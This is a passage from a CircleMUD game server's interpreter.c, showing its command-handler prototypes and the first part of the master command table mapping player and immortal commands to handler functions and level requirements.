/**************************************************************************
*   File: interpreter.c                                 Part of CircleMUD *
*  Usage: parse user commands, search for specials, call ACMD functions   *
*                                                                         *
*  All rights reserved.  See license.doc for complete information.        *
*                                                                         *
*  Copyright (C) 1993, 94 by the Trustees of the Johns Hopkins University *
*  CircleMUD is based on DikuMUD, Copyright (C) 1990, 1991.               *
************************************************************************ */

#define __INTERPRETER_C__

#include "conf.h"
#include "sysdep.h"

#include "structs.h"
#include "comm.h"
#include "interpreter.h"
#include "db.h"
#include "utils.h"
#include "spells.h"
#include "handler.h"
#include "mail.h"
#include "screen.h"
#include "olc.h"
#include "hometowns.h"
#include "dg_scripts.h"
#include "clan.h"

extern const struct title_type titles[NUM_CLASSES][LVL_IMPL + 1];
extern char *motd;
extern char *imotd;
extern char *background;
extern char *MENU;
extern char *WELC_MESSG;
extern char *START_MESSG;
extern struct char_data *character_list;
extern struct descriptor_data *descriptor_list;
extern struct player_index_element *player_table;
extern int top_of_p_table;
extern int restrict;
extern struct index_data *mob_index;
extern struct index_data *obj_index;
extern struct room_data *world;
extern int most_on;
extern char *get_spec_name(SPECIAL(func));

/* external functions */
void echo_on(struct descriptor_data *d);
void echo_off(struct descriptor_data *d);
void do_start(struct char_data *ch);
void init_char(struct char_data *ch);
int create_entry(char *name);
int special(struct char_data *ch, int cmd, char *arg);
int isbanned(char *hostname);
int Valid_Name(char *newname);
void oedit_parse(struct descriptor_data *d, char *arg);
void read_saved_vars(struct char_data *ch);
void redit_parse(struct descriptor_data *d, char *arg);
void zedit_parse(struct descriptor_data *d, char *arg);
void medit_parse(struct descriptor_data *d, char *arg);
void sedit_parse(struct descriptor_data *d, char *arg);
void trigedit_parse(struct descriptor_data *d, char *arg);
// void write_event(char *event);
void do_newbie(struct char_data *vict);
extern int race_class_bonus[1092][6];
int Valid_Name(char *newname);

/* quickie command */
ACMD(do_sorc_dam);

/* DG Script ACMD's */
ACMD(do_warning);
ACMD(do_mobhunt);
ACMD(do_attach);
ACMD(do_detach);
ACMD(do_tlist);
ACMD(do_tstat);
ACMD(do_masound);
ACMD(do_mkill);
ACMD(do_mjunk);
ACMD(do_mdoor);
ACMD(do_mechoaround);
ACMD(do_msend);
ACMD(do_mecho);
ACMD(do_mload);
ACMD(do_mpurge);
ACMD(do_mgoto);
ACMD(do_mat);
ACMD(do_vctell);
ACMD(do_mteleport);
ACMD(do_mforce);
ACMD(do_mexp);
ACMD(do_mqpadd);
ACMD(do_mgold);
ACMD(do_mhunt);
ACMD(do_mremember);
ACMD(do_mforget);
ACMD(do_mtransform);
ACMD(do_vdelete);


/* prototypes for all do_x functions. */
ACMD(do_autoquest);
ACMD(do_digup);
ACMD(do_iweather);
ACMD(do_bury);
ACMD(do_aid);	
ACMD(do_action);
ACMD(do_addexp);
ACMD(do_addprac);
ACMD(do_addlag);
ACMD(do_absorb);
ACMD(do_advance);
ACMD(do_affects);
ACMD(do_ahall);
ACMD(do_alias);
ACMD(do_all);
ACMD(do_fog);
ACMD(do_auction);
ACMD(do_arena);
ACMD(do_assist);
ACMD(do_assign);
ACMD(do_assign_player);
ACMD(do_at);
ACMD(do_aura_of_nature);
ACMD(do_awe);
ACMD(do_awho);
ACMD(do_backslash);
ACMD(do_backstab);
ACMD(do_bodyslam);
ACMD(do_board);
ACMD(do_ban);
ACMD(do_bandage);
ACMD(do_bash);
ACMD(do_bearhug);
ACMD(do_beg);
ACMD(do_bet);
ACMD(do_befriend);
ACMD(do_berserk);
ACMD(do_bid);
ACMD(do_bite);
ACMD(do_bitchslap);
ACMD(do_immbless);
ACMD(do_brain);
ACMD(do_brew);
ACMD(do_burrow);
ACMD(do_call);
ACMD(do_cancel);
ACMD(do_cast);
ACMD(do_castout);
ACMD(do_chant);
ACMD(do_chaos);
ACMD(do_charge);
ACMD(do_chop);
ACMD(do_chown);
ACMD(do_chronocross);
ACMD(do_cloud_cover);
ACMD(do_circle);
ACMD(do_clan);
// ACMD(do_climb);
ACMD(do_color);
ACMD(do_commands);
ACMD(do_compare);
ACMD(do_connect);
ACMD(do_consider);
ACMD(do_copyto);
ACMD(do_credits);
ACMD(do_ctell);
ACMD(do_date);
ACMD(do_dc);
ACMD(do_deathblow);
ACMD(do_deathcall);
ACMD(do_describe);
ACMD(do_deceive);
ACMD(do_diagnose);
ACMD(do_dig);
ACMD(do_disarm);
ACMD(do_disembark);
ACMD(do_dismount);
ACMD(do_display);
ACMD(do_doorbash);
ACMD(do_doublexp);
ACMD(do_drain);
ACMD(do_drink);
ACMD(do_drop);
ACMD(do_drown);
ACMD(do_dualwield);
ACMD(do_dupe);
ACMD(do_eat);
ACMD(do_echo);
ACMD(do_elemental);
ACMD(do_elemental_summon);
ACMD(do_enable);
ACMD(do_end);
ACMD(do_enter);
ACMD(do_equipment);
ACMD(do_examine);
ACMD(do_exchange);
ACMD(do_exit);
ACMD(do_exits);
ACMD(do_eyegouge);
ACMD(do_fairyfollower);
ACMD(do_file);
ACMD(do_find_flesh);
ACMD(do_finger);
ACMD(do_flee);
ACMD(do_flux);
ACMD(do_follow);
ACMD(do_forage);
ACMD(do_force);
ACMD(do_fury);
ACMD(do_furl);
ACMD(do_gauge);
ACMD(do_gecho);
ACMD(do_gmote);
ACMD(do_gen_comm);
ACMD(do_gen_door);
ACMD(do_gen_ps);
ACMD(do_gen_tog);
ACMD(do_gen_write);
ACMD(do_get);
ACMD(do_give);
ACMD(do_gold);
ACMD(do_goto);
ACMD(do_grab);
ACMD(do_groinkick);
ACMD(do_group);
ACMD(do_gsay);
ACMD(do_gut);
ACMD(do_has);
ACMD(do_hcontrol);
ACMD(do_harness);
ACMD(do_headcut);
ACMD(do_headbut);
ACMD(do_help);
ACMD(do_hide);
ACMD(do_hiss);
ACMD(do_hit);
ACMD(do_holdbreath);
ACMD(do_hover);
ACMD(do_hone);
ACMD(do_house);
ACMD(do_incognito);
ACMD(do_info);
ACMD(do_imbibe);
ACMD(do_inform);
ACMD(do_insult);
ACMD(do_inventory);
ACMD(do_invis);
ACMD(do_ihide);
ACMD(do_imsg);
ACMD(do_kamikaze);
ACMD(do_ki);
ACMD(do_kiss);
ACMD(do_kick);
ACMD(do_kickflip);
ACMD(do_kill);
ACMD(do_knee);
ACMD(do_knockout);
ACMD(do_last);
ACMD(do_leave);
ACMD(do_levels);
ACMD(do_links);
ACMD(do_load);
ACMD(do_look);
ACMD(do_lookout);
ACMD(do_lowblow);
ACMD(do_map);
ACMD(do_mesmerize);
ACMD(do_monsoon);
ACMD(do_motherearth);
ACMD(do_move);
ACMD(do_mix);
ACMD(do_mount);
ACMD(do_mlist);
ACMD(do_mobat);
ACMD(do_not_here);
ACMD(do_offer);
ACMD(do_objlist);
ACMD(do_olc);
ACMD(do_olcsave);
ACMD(do_olist);
ACMD(do_omni);
ACMD(do_order);
ACMD(do_page);
ACMD(do_peace);  /* Storm 8/2/98  */
ACMD(do_pitbet);
ACMD(do_playtime);
ACMD(do_plist);
// ACMD(do_poofset);
ACMD(do_poof);
ACMD(do_poofin);
ACMD(do_poofout);
ACMD(do_pour);
ACMD(do_powerslash);
ACMD(do_practice);
ACMD(do_pray);
ACMD(do_pressure);
ACMD(do_private_channel);
ACMD(do_psychostab);
ACMD(do_purge);
ACMD(do_push);
ACMD(do_put);
ACMD(do_passwd);
ACMD(do_qadmin);
ACMD(do_qcomm);
ACMD(do_qpmanage);
ACMD(do_qteleport);
ACMD(do_qtransport);
ACMD(do_quit);
ACMD(do_quickdraw);
ACMD(do_random);
ACMD(do_recall);
ACMD(do_reboot);
ACMD(do_reimb);
ACMD(do_reelin);
ACMD(do_rembit);
ACMD(do_remove);
ACMD(do_rend);
ACMD(do_rent);
ACMD(do_reply);
ACMD(do_report);
ACMD(do_rescue);
ACMD(do_rest);
ACMD(do_restore);
ACMD(do_return);
ACMD(do_rise);
ACMD(do_rlist);
ACMD(do_roundhouse);
ACMD(do_rub);
ACMD(do_run);
ACMD(do_save);
ACMD(do_sac);
ACMD(do_say);
ACMD(do_scan);
ACMD(do_scribe);
ACMD(do_score);
ACMD(do_scorch);
ACMD(do_send);
ACMD(do_set);
ACMD(do_show);
ACMD(do_shieldpunch);
ACMD(do_shutdown);
ACMD(do_sit);
ACMD(do_abilset);
ACMD(do_abilstat);
ACMD(do_shadow);
ACMD(do_sleep);
ACMD(do_sleight);
ACMD(do_sneak);
ACMD(do_snoop);
ACMD(do_spec_comm);
ACMD(do_speedwalk);
ACMD(do_spells);
ACMD(do_spit_blood);
ACMD(do_split);
ACMD(do_sprinkle);
ACMD(do_spy);
ACMD(do_stand);
ACMD(do_stat);
ACMD(do_steal);
ACMD(do_steer);
ACMD(do_stun);
ACMD(do_swarm);
ACMD(do_swoop);
ACMD(do_swat);
ACMD(do_stomp);
ACMD(do_sweep);
ACMD(do_switch);
ACMD(do_sword_thrust);
ACMD(do_syslog);
ACMD(do_soulsuck);
ACMD(do_tackle);
ACMD(do_taint);
ACMD(do_tangleweed);
ACMD(do_teleport);
ACMD(do_tell);
ACMD(do_tear);
ACMD(do_throw);
ACMD(do_time);
ACMD(do_title);
ACMD(do_tnl);
ACMD(do_toggle);
ACMD(do_track);
ACMD(do_train);
ACMD(do_trample);
ACMD(do_trans);
ACMD(do_trickpunch);
ACMD(do_trip);
ACMD(do_turn);
ACMD(do_unban);
ACMD(do_unfurl);
ACMD(do_ungroup);
ACMD(do_uppercut);
ACMD(do_use);
ACMD(do_users);
ACMD(do_vanish);
ACMD(do_visible);
ACMD(do_vnum);
ACMD(do_vstat);
ACMD(do_vwear);
ACMD(do_wake);
ACMD(do_warcry);
ACMD(do_wear);
ACMD(do_weather);
ACMD(do_wheel);
ACMD(do_where);
ACMD(do_who);
ACMD(do_whois);
ACMD(do_wield);
ACMD(do_wimpy);
ACMD(do_wizlock);
ACMD(do_wiznet);
ACMD(do_wizutil);
ACMD(do_write);
ACMD(do_xname);
ACMD(do_zreset);

/* This is the Master Command List(tm).

 * You can put new commands in, take commands out, change the order
 * they appear in, etc.  You can adjust the "priority" of commands
 * simply by changing the order they appear in the command list.
 * (For example, if you want "as" to mean "assist" instead of "ask",
 * just put "assist" above "ask" in the Master Command List(tm).
 *
 * In general, utility commands such as "at" should have high priority;
 * infrequently used and dangerously destructive commands should have low
 * priority.
 */

const struct command_info cmd_info[] = {
  { "RESERVED", 0, 0, 0, 0 },	/* this must be first -- for specprocs */

  /* directions must come before other commands but after RESERVED */
  { "north"    , POS_STANDING, do_move     , 0, SCMD_NORTH },
  { "east"     , POS_STANDING, do_move     , 0, SCMD_EAST },
  { "south"    , POS_STANDING, do_move     , 0, SCMD_SOUTH },
  { "west"     , POS_STANDING, do_move     , 0, SCMD_WEST },
  { "up"       , POS_STANDING, do_move     , 0, SCMD_UP },
  { "down"     , POS_STANDING, do_move     , 0, SCMD_DOWN },
  { "northeast", POS_STANDING, do_move     , 0, SCMD_NORTHEAST },
  { "northwest", POS_STANDING, do_move     , 0, SCMD_NORTHWEST },
  { "southeast", POS_STANDING, do_move     , 0, SCMD_SOUTHEAST },
  { "southwest", POS_STANDING, do_move     , 0, SCMD_SOUTHWEST },

  /* now, the main list */
  { "at"       , POS_DEAD    , do_at       , LVL_IMMORT, 0 },
  { "affects"  , POS_SLEEPING, do_affects  , 0, 0 },
  { "afk"      , POS_SLEEPING, do_gen_tog  , 0, SCMD_AFK },
  { "addexp"   , POS_DEAD    , do_addexp   , LVL_CODER_H, 0 },
  { "absorb"   , POS_RESTING , do_absorb   , 0, 0 },
  { "addprac"  , POS_DEAD    , do_addprac  , LVL_CODER_H, 0 },
  { "addlag"   , POS_DEAD    , do_addlag   , LVL_CODER_H, 0 },
  { "advance"  , POS_DEAD    , do_advance  , LVL_CODER_H, 0 },
  { "ahall"    , POS_DEAD    , do_ahall    , 0, 0 },
  { "alias"    , POS_DEAD    , do_alias    , 0, 0 },
  { "arena"    , POS_STANDING, do_arena    , 0, 0 },
  { "arinfo"   , POS_SLEEPING, do_gen_tog  , 0, SCMD_ARENA },
  { "assist"   , POS_FIGHTING, do_assist   , 1, 0 },
  { "ask"      , POS_RESTING , do_spec_comm, 0, SCMD_ASK },
  { "all"      , POS_DEAD    , do_all      , 0, 0 },
  { "aid"      , POS_STANDING, do_aid      , 0, 0 },
  { "aquest"   , POS_STANDING, do_autoquest, 0, 0 },
  { "auction"  , POS_RESTING,  do_auction  , 0, 0 },
  { "auctalk"  , POS_SLEEPING, do_gen_comm , 0, SCMD_AUCTION },
  { "autoassist",POS_RESTING , do_gen_tog  , 0, SCMD_AUTOASSIST },
  { "autodiagnose",POS_SLEEPING,do_gen_tog , 0, SCMD_AUTODIAG},
  { "autoexit" , POS_DEAD    , do_gen_tog  , 0, SCMD_AUTOEXIT },
  { "autoloot" , POS_DEAD    , do_gen_tog  , 0, SCMD_AUTOLOOT },
  { "autoquest", POS_STANDING, do_autoquest, 0, 0 },
  { "automap"  , POS_DEAD    , do_gen_tog  , 0, SCMD_AUTOMAP },
  { "autosac"  , POS_DEAD    , do_gen_tog  , 0, SCMD_AUTOSAC },
  { "autosplit", POS_DEAD    , do_gen_tog  , 0, SCMD_AUTOSPLIT },
  { "autotitle", POS_DEAD    , do_gen_tog  , 0, SCMD_AUTOTITLE },
  { "awe"      , POS_FIGHTING, do_awe      , 0, 0 },
  { "awho"     , POS_DEAD    , do_awho     , 0, 0 },
  { "assign"   , POS_DEAD    , do_assign   , LVL_ADMIN, 0},
  { "assignplayer", POS_SITTING, do_assign_player, 0, 0},
  { "ack"      , POS_SITTING , do_action   , 0, 0 },
  { "admire"   , POS_SITTING , do_action   , 0, 0 },
  { "agree"    , POS_RESTING , do_action   , 0, 0 },
  { "accuse"   , POS_SITTING , do_action   , 0, 0 },
  { "adjust"   , POS_SITTING , do_action   , 0, 0 },
  { "apologize", POS_SITTING , do_action   , 0, 0 },
  { "applaud"  , POS_RESTING , do_action   , 0, 0 },
  { "aura"     , POS_STANDING, do_aura_of_nature, 0, 0 },

  { "backslash", POS_FIGHTING, do_backslash, 1, 0 },
  { "backstab" , POS_STANDING, do_backstab , 1, 0 },
  { "ban"      , POS_DEAD    , do_ban      , 158, 0 },
  { "bandage"  , POS_STANDING, do_bandage  , 0, 0 },
  { "balance"  , POS_STANDING, do_not_here , 1, 0 },
  { "bash"     , POS_FIGHTING, do_bash     , 1, 0 },
  { "bearhug"  , POS_FIGHTING, do_bearhug  , 0, 0 },
  { "bet"      , POS_DEAD    , do_bet	   , 0, 0 },
  { "bite"     , POS_STANDING, do_bite     , 0, 0 },
  { "bitchslap", POS_RESTING , do_bitchslap, LVL_IMPL, 0 },
  { "bodyslam" , POS_FIGHTING, do_bodyslam , 0, 0 },
  { "board"    , POS_STANDING, do_board    , 0, 0 },
  { "brain"    , POS_FIGHTING, do_brain    , 0, 0 },
  { "brew"     , POS_STANDING, do_brew     , 0, 0 },
  { "brief"    , POS_DEAD    , do_gen_tog  , 0, SCMD_BRIEF },
  { "buy"      , POS_STANDING, do_not_here , 0, 0 },
  { "bug"      , POS_DEAD    , do_gen_write, 0, SCMD_BUG },
  { "babble"   , POS_SITTING , do_action   , 0, 0 },
  { "bounce"   , POS_STANDING, do_action   , 0, 0 },
  { "bark"     , POS_RESTING , do_action   , 0, 0 },
  { "beckon"   , POS_RESTING , do_action   , 0, 0 },
  { "beer"     , POS_STANDING, do_action   , 0, 0 },
  { "beg"      , POS_RESTING , do_beg      , 0, 0 },
  { "befriend" , POS_STANDING, do_befriend , 0, 0 },
  { "berserk"  , POS_STANDING, do_berserk  , 0, 0 },
  { "bid"      , POS_RESTING,  do_bid      , 0, 0 },
  { "bite"     , POS_STANDING, do_action   , 0, 0 },
  { "bleed"    , POS_RESTING , do_action   , 0, 0 },
  { "blink"    , POS_RESTING , do_action   , 0, 0 },
  { "blush"    , POS_RESTING , do_action   , 0, 0 },
  { "boast"    , POS_RESTING , do_action   , 0, 0 },
  { "boggle"   , POS_RESTING , do_action   , 0, 0 },
  { "bonk"     , POS_STANDING, do_action   , 0, 0 },
  { "bounty"   , POS_STANDING, do_not_here , 0, 0 },  
  { "bow"      , POS_STANDING, do_action   , 0, 0 },
  { "brb"      , POS_RESTING , do_action   , 0, 0 },
  { "burp"     , POS_RESTING , do_action   , 0, 0 },
//  { "bury"     , POS_STANDING, do_bury     , 0, 0 },
  { "burrow"   , POS_RESTING , do_burrow   , 0, 0 },

  { "cast"     , POS_SITTING , do_cast     , 1, 0 },
  { "castout"  , POS_SITTING , do_castout  , 1, 0 },
  { "catch"    , POS_STANDING, do_not_here , 0, 0 },
  { "call"     , POS_FIGHTING, do_call     , 1, 0 },
  { "cancel"   , POS_SITTING,  do_not_here , 1, 0 },
  { "chant"    , POS_SITTING , do_chant    , 1, 0 },
  { "chants"   , POS_SLEEPING, do_spells   , 0, SCMD_CHANTS },
  { "chantset" , POS_DEAD    , do_abilset  , 156, SCMD_CHANTS },
  { "chaos"    , POS_SLEEPING, do_chaos    , LVL_IMMORT, 0 },
  { "charge"   , POS_STANDING, do_charge   , 1, 0 },
  { "check"    , POS_STANDING, do_not_here , 1, 0 },
  { "chop"     , POS_FIGHTING, do_chop     , 0, 0 },
  { "chown"    , POS_STANDING, do_chown    , 154, 0 },
  { "chronocross",POS_STANDING,do_not_here , 0, 0 },
  { "close"    , POS_SITTING , do_gen_door , 0, SCMD_CLOSE },
  { "cloud"    , POS_STANDING, do_cloud_cover , 0, 0 },
  { "circle"   , POS_FIGHTING, do_circle   , 0, 0 },
  { "clan"     , POS_SLEEPING, do_clan     , 0, 0 },
  { "clear"    , POS_DEAD    , do_gen_ps   , 0, SCMD_CLEAR },
//  { "climb"    , POS_STANDING, do_climb    , 0, 0 },
  { "cls"      , POS_DEAD    , do_gen_ps   , 0, SCMD_CLEAR },
  { "consider" , POS_RESTING , do_consider , 0, 0 },
  { "color"    , POS_DEAD    , do_color    , 0, 0 },
  { "commands" , POS_DEAD    , do_commands , 0, SCMD_COMMANDS },
  { "commune"  , POS_RESTING , do_gen_comm , 1, SCMD_COMMUNE },
  { "compare"  , POS_RESTING , do_compare  , 0, 0 },
  { "compact"  , POS_DEAD    , do_gen_tog  , 0, SCMD_COMPACT },
  { "connect"  , POS_SITTING , do_connect  , 1, 0 },
  { "credits"  , POS_DEAD    , do_gen_ps   , 0, SCMD_CREDITS },
  { "ctell"    , POS_SLEEPING, do_vctell    , 0, 0 },
  { "caress"   , POS_SITTING , do_action   , 0, 0 },
  { "cheer"    , POS_RESTING,  do_action   , 0, 0 },
  { "cackle"   , POS_RESTING , do_action   , 0, 0 },
  { "cuddle"   , POS_RESTING , do_action   , 0, 0 },
  { "chuckle"  , POS_RESTING , do_action   , 0, 0 },
  { "collapse" , POS_STANDING, do_action   , 0, 0 },
  { "comfort"  , POS_RESTING , do_action   , 0, 0 },
  { "comb"     , POS_RESTING , do_action   , 0, 0 },
  { "clap"     , POS_RESTING , do_action   , 0, 0 },
  { "curse"    , POS_RESTING , do_action   , 0, 0 },
  { "copyto"   , POS_RESTING , do_copyto   , LVL_BUILDER, 0 },
  { "cough"    , POS_RESTING , do_action   , 0, 0 },
  { "cpr"      , POS_STANDING, do_action   , 0, 0 },
  { "cringe"   , POS_RESTING , do_action   , 0, 0 },
  { "cry"      , POS_RESTING , do_action   , 0, 0 },
  { "curtsey"  , POS_STANDING, do_action   , 0, 0 },

  { "date"     , POS_DEAD    , do_date     , 0, SCMD_DATE },
  { "dc"       , POS_DEAD    , do_dc       , LVL_ADMIN, 0 },
  { "deathblow", POS_FIGHTING, do_deathblow, 1, 0 },
  { "deathcall", POS_STANDING, do_deathcall, 0, 0 },
  { "deposit"  , POS_STANDING, do_not_here , 1, 0 },
  { "describe" , POS_DEAD    , do_describe , 1, 0 },
  { "deceive"  , POS_FIGHTING, do_deceive  , 0, 0 },
  { "diagnose" , POS_RESTING , do_diagnose , 0, 0 },
  { "dig"      , POS_RESTING , do_dig      , LVL_BUILDER, 0 },
  { "disarm"   , POS_FIGHTING, do_disarm   , 1, 0 },
  { "disembark", POS_STANDING, do_disembark, 1, 0 },
  { "dismount" , POS_RESTING , do_dismount , 1, 0 },
  { "dirtthrow", POS_FIGHTING, do_eyegouge , 0, 0 },
  { "display"  , POS_DEAD    , do_display  , 0, 0 },
  { "donate"   , POS_RESTING , do_drop     , 0, SCMD_DONATE },
  { "doorbash" , POS_STANDING, do_doorbash , 1, 0 },
  { "doublexp" , POS_DEAD    , do_doublexp , 158, 0 },
  { "drink"    , POS_RESTING , do_drink    , 0, SCMD_DRINK },
  { "drop"     , POS_RESTING , do_drop     , 0, SCMD_DROP },
  { "dance"    , POS_STANDING, do_action   , 0, 0 },
  { "daydream" , POS_SLEEPING, do_action   , 0, 0 },
  { "doh"      , POS_RESTING , do_action   , 0, 0 },
  { "drain"    , POS_RESTING , do_drain    , 0, 0 },
  { "drool"    , POS_RESTING , do_action   , 0, 0 },
  { "drown"    , POS_FIGHTING, do_drown    , 0, 0 },
  { "dualwield", POS_RESTING , do_dualwield, 0, 0 },
  { "duck"     , POS_STANDING, do_action   , 0, 0 },
  { "dupe"     , POS_STANDING, do_dupe     , 156, 0 },

  { "eat"      , POS_RESTING , do_eat      , 0, SCMD_EAT },
  { "echo"     , POS_SLEEPING, do_echo     , LVL_IMMORT, SCMD_ECHO },
  { "emote"    , POS_RESTING , do_echo     , 1, SCMD_EMOTE },
  { ":"        , POS_RESTING , do_echo     , 1, SCMD_EMOTE },
  { "elemental", POS_FIGHTING, do_elemental, 0, 0 },
//  { "enter"    , POS_STANDING, do_enter    , 0, 0 },
  { "equipment", POS_SLEEPING, do_equipment, 0, 0 },
  { "exits"    , POS_RESTING , do_exits    , 0, 0 },
  { "examine"  , POS_SITTING , do_examine  , 0, 0 },
  { "eyegouge" , POS_FIGHTING, do_eyegouge , 0, 0 },
  { "eek"      , POS_RESTING , do_action   , 0, 0 },
  { "embrace"  , POS_STANDING, do_action   , 0, 0 },
  { "end"      , POS_RESTING,  do_end      , 0, 0 },
  { "enable"   , POS_DEAD,     do_enable   , LVL_CODER, 0 },
  { "envy"     , POS_RESTING,  do_action   , 0, 0 },
  { "exchange" , POS_STANDING, do_exchange , 0, 0 },
  { "eyebrow"  , POS_RESTING,  do_action   , 0, 0 },
  { "eyepoke"  , POS_STANDING, do_action   , 0, 0 },
 
  { "force"    , POS_SLEEPING, do_force    , 158, 0 },
  { "fairyfollower", POS_STANDING, do_fairyfollower, 0, 0 },
  { "file"     , POS_DEAD    , do_file     , 151, 0 },
  { "fill"     , POS_STANDING, do_pour     , 0, SCMD_FILL },
  { "findflesh", POS_STANDING, do_find_flesh,0, 0 },
  { "flags"    , POS_DEAD    , do_toggle   , 1, 0 },
  { "flee"     , POS_FIGHTING, do_flee     , 1, SCMD_FLEE },
  { "flux"     , POS_RESTING , do_flux     , LVL_ADMIN, 0 },
  { "fog"      , POS_FIGHTING, do_fog      , 0, 0 },
  { "follow"   , POS_RESTING , do_follow   , 0, 0 },
  { "forage"   , POS_STANDING, do_forage   , 0, 0 },
  { "freeze"   , POS_DEAD    , do_wizutil  , LVL_FREEZE, SCMD_FREEZE },
  { "fury"     , POS_FIGHTING, do_fury     , 1, 0 },
  { "furl"     , POS_FIGHTING, do_furl     , 1, 0 },
  { "fart"     , POS_RESTING , do_action   , 0, 0 },
  { "faint"    , POS_STANDING, do_action   , 0, 0 },
  { "finger"   , POS_RESTING , do_finger   , 0, 0 },
  { "flex"     , POS_STANDING, do_action   , 0, 0 },
  { "flip"     , POS_STANDING, do_action   , 0, 0 },
  { "flirt"    , POS_RESTING , do_action   , 0, 0 },
  { "flutter"  , POS_RESTING , do_action   , 0, 0 },
  { "fondle"   , POS_RESTING , do_action   , 0, 0 },
  { "freak"    , POS_STANDING, do_action   , 0, 0 },
  { "french"   , POS_RESTING , do_action   , 0, 0 },
  { "frown"    , POS_RESTING , do_action   , 0, 0 },
  { "fume"     , POS_RESTING , do_action   , 0, 0 },

  { "get"      , POS_RESTING , do_get      , 0, 0 },
  { "gain"     , POS_STANDING, do_not_here , 0, 0 },
  { "gamble"   , POS_STANDING, do_not_here , 0, 0 },
  { "gauge"    , POS_STANDING, do_gauge    , 1, 0 },
  { "gecho"    , POS_DEAD    , do_gecho    , 154, 0 },
  { "give"     , POS_RESTING , do_give     , 0, 0 },
  { "goto"     , POS_SLEEPING, do_goto     , LVL_IMMORT, 0 },
  { "gold"     , POS_RESTING , do_gold     , 0, 0 },
  { "gossip"   , POS_SLEEPING, do_gen_comm , 0, SCMD_GOSSIP },
  { "group"    , POS_RESTING , do_group    , 1, 0 },
  { "groinkick", POS_FIGHTING, do_groinkick, 0, 0 },
  { "grab"     , POS_RESTING , do_grab     , 0, 0 },
  { "grid"     , POS_RESTING , do_not_here , 0, 0 },
  { "grats"    , POS_SLEEPING, do_gen_comm , 0, SCMD_GRATZ },
  { "gsay"     , POS_SLEEPING, do_gsay     , 0, 0 },
  { "gtell"    , POS_SLEEPING, do_gsay     , 0, 0 },
  { "gut"      , POS_FIGHTING, do_gut     , 1, 0 },
  { "gack"     , POS_RESTING , do_action   , 0, 0 },
  { "gag"      , POS_RESTING , do_action   , 0, 0 },
  { "gaff"     , POS_STANDING, do_action   , 0, 0 },
  { "gasp"     , POS_RESTING , do_action   , 0, 0 },
  { "gaze"     , POS_RESTING , do_action   , 0, 0 },
  { "giggle"   , POS_RESTING , do_action   , 0, 0 },
  { "glare"    , POS_RESTING , do_action   , 0, 0 },
  { "goose"    , POS_STANDING, do_action   , 0, 0 },
  { "greet"    , POS_RESTING , do_action   , 0, 0 },
  { "grimace"  , POS_RESTING , do_action   , 0, 0 },
  { "grin"     , POS_RESTING , do_action   , 0, 0 },
  { "groan"    , POS_RESTING , do_action   , 0, 0 },
  { "grope"    , POS_RESTING , do_action   , 0, 0 },
  { "grovel"   , POS_RESTING , do_action   , 0, 0 },
  { "growl"    , POS_RESTING , do_action   , 0, 0 },
  { "grumble"  , POS_RESTING , do_action   , 0, 0 },
  { "grunt"    , POS_RESTING , do_action   , 0, 0 },

  { "help"     , POS_DEAD    , do_help     , 0, 0 },
  { "harness"  , POS_FIGHTING, do_harness  , 0, 0 },
  { "has"      , POS_SLEEPING, do_has      , 0, 0 },
  { "handbook" , POS_DEAD    , do_gen_ps   , LVL_IMMORT, SCMD_HANDBOOK },
  { "hcontrol" , POS_DEAD    , do_hcontrol , LVL_BUILDER_H, 0 },
  { "headbut"  , POS_FIGHTING, do_headbut  , 0, 0 },
  { "headcut"  , POS_FIGHTING, do_headcut  , 0, 0 },
  { "hide"     , POS_RESTING , do_hide     , 1, 0 },
  { "hiss"     , POS_RESTING , do_hiss     , 0, 0 },
  { "hit"      , POS_FIGHTING, do_hit      , 0, SCMD_HIT },
  { "hold"     , POS_RESTING , do_grab     , 1, 0 },
  { "holdbreath",POS_RESTING , do_holdbreath, 0, 0 },
//  { "holler"   , POS_RESTING , do_gen_comm , 1, SCMD_HOLLER },
  { "holylight", POS_DEAD    , do_gen_tog  , LVL_IMMORT, SCMD_HOLYLIGHT },
  { "hone"     , POS_RESTING , do_hone     , 0, 0 },
  { "house"    , POS_RESTING , do_house    , 0, 0 },
  { "halo"     , POS_RESTING , do_action   , 0, 0 },
  { "hiccup"   , POS_RESTING , do_action   , 0, 0 },
  { "highfive" , POS_STANDING, do_action   , 0, 0 },
  { "hmm"      , POS_RESTING , do_action   , 0, 0 },
  { "hmph"     , POS_RESTING , do_action   , 0, 0 },
  { "hop"      , POS_RESTING , do_action   , 0, 0 },
  { "hover"    , POS_STANDING, do_hover    , 0, 0 },
  { "howl"     , POS_RESTING , do_action   , 0, 0 },
  { "hug"      , POS_RESTING , do_action   , 0, 0 },
  { "hum"      , POS_RESTING , do_action   , 0, 0 },
  { "hush"     , POS_RESTING , do_action   , 0, 0 },

  { "inventory", POS_DEAD    , do_inventory, 0, 0 },
  { "immbless" , POS_DEAD    , do_immbless , LVL_CODER, 0 },
  { "incognito", POS_STANDING, do_incognito, 0, 0 },
  { "idea"     , POS_DEAD    , do_gen_write, 0, SCMD_IDEA },
  { "imotd"    , POS_DEAD    , do_gen_ps   , LVL_IMMORT, SCMD_IMOTD },
  { "immlist"  , POS_DEAD    , do_gen_ps   , 0, SCMD_IMMLIST },
  { "info"     , POS_SLEEPING, do_gen_ps   , 0, SCMD_INFO },
  { "imbibe"   , POS_RESTING , do_imbibe   , 0, 0 },
  { "inform"   , POS_RESTING , do_not_here , 0, 0 },
  { "insult"   , POS_RESTING , do_insult   , 0, 0 },
  { "invis"    , POS_DEAD    , do_invis    , LVL_IMMORT, 0 },
  { "innocent" , POS_RESTING , do_action   , 0, 0 },
  { "ihide"    , POS_DEAD , do_ihide    , LVL_IMMORT, 0 },  
  { "imsg"     , POS_DEAD,  do_imsg     , LVL_IMMORT, 0 },
  { "identify" , POS_RESTING , do_not_here , 0, 0 },

  { "join"     , POS_STANDING, do_not_here , 0, 0 },
  { "junk"     , POS_RESTING , do_drop    , 0, SCMD_JUNK },
  { "jump"     , POS_STANDING, do_enter   , 0, SCMD_JUMP },
  { "joint"    , POS_RESTING , do_action  , 0, 0 },

  { "ki"       , POS_STANDING, do_ki       , 0, 0 },
  { "kill"     , POS_FIGHTING, do_kill     , 0, 0 },
  { "kamikaze" , POS_FIGHTING, do_kamikaze , 0, 0 },
  { "kick"     , POS_FIGHTING, do_kick     , 1, 0 },
  { "kickflip" , POS_FIGHTING, do_kickflip , 1, 0 },
  { "knee"     , POS_FIGHTING, do_knee     , 0, 0 },
  { "kneel"    , POS_STANDING, do_not_here , 1, 0 },
  { "knockout" , POS_FIGHTING, do_knockout , 1, 0 },
  { "kiss"     , POS_RESTING , do_kiss   , 0, 0 },

  { "look"     , POS_RESTING , do_look     , 0, SCMD_LOOK },
